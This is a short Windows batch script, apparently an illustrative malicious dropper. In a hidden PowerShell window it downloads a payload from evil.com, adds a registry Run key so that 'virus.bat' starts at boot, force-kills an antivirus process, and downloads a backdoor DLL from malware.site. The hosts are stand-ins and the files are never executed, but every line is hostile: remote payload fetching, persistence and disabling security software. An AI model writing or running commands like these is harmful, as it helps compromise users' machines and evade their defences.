@echo off
powershell -hidden -command wget http://evil.com/payload.exe
reg add HKLM\Software\Microsoft\Windows\CurrentVersion\Run /v evil /t REG_SZ /d virus.bat
taskkill /F /IM antivirus.exe
curl -O http://malware.site/backdoor.dll